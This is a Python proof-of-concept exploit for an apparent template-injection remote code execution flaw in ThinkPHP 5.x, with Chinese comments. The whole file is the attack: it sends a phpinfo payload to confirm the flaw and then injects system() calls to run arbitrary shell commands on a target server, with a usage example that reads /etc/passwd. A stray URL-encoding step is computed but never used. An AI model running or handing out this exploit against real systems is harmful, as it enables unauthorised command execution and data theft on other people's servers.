#!/usr/bin/env python3
"""
ThinkPHP 5.x Template Injection RCE PoC (URL parameter injection)
Usage: 
  python thinkphp_template_rce.py http://target:8080              # 执行 phpinfo 测试
  python thinkphp_template_rce.py http://target:8080 "id"         # 执行系统命令
"""

import sys
import requests
import urllib.parse

def test_vulnerability(target):
    """通过执行 phpinfo 检测漏洞是否存在"""
    # Payload: ${@phpinfo()} 需要 URL 编码 {} 为 %7B %7D，但通常直接发送即可，部分服务端可能需编码
    payload_path = "/index.php?s=/index/index/name/${@phpinfo()}"
    url = target.rstrip("/") + payload_path
    try:
        resp = requests.get(url, timeout=10)
        if "PHP Version" in resp.text or "phpinfo" in resp.text:
            print("[+] Target is vulnerable! (phpinfo detected)")
            return True
        else:
            print("[-] phpinfo output not found in response, may not be vulnerable or output suppressed.")
            print("Response snippet:", resp.text[:300])
            return False
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return False

def execute_command(target, cmd):
    """执行系统命令并显示结果"""
    # 使用 ${@system('cmd')} 执行命令
    # 为了在 URL 中安全传递，需要对特殊字符进行 URL 编码
    quoted_cmd = urllib.parse.quote(cmd)
    # 构造完整 payload
    payload_path = f"/index.php?s=/index/index/name/${{@system('{cmd}')}}"
    url = target.rstrip("/") + payload_path
    print(f"[*] Executing command: {cmd}")
    try:
        resp = requests.get(url, timeout=10)
        print(f"[*] Response status: {resp.status_code}")
        if resp.text:
            print("[+] Response body:")
            print(resp.text)
        else:
            print("[!] Empty response, command may have executed blindly.")
    except Exception as e:
        print(f"[-] Request failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [command]")
        print(f"Example: {sys.argv[0]} http://192.168.1.100:8080")
        print(f"         {sys.argv[0]} http://192.168.1.100:8080 'cat /etc/passwd'")
        sys.exit(1)

    target = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 else None

    if cmd:
        execute_command(target, cmd)
    else:
        test_vulnerability(target)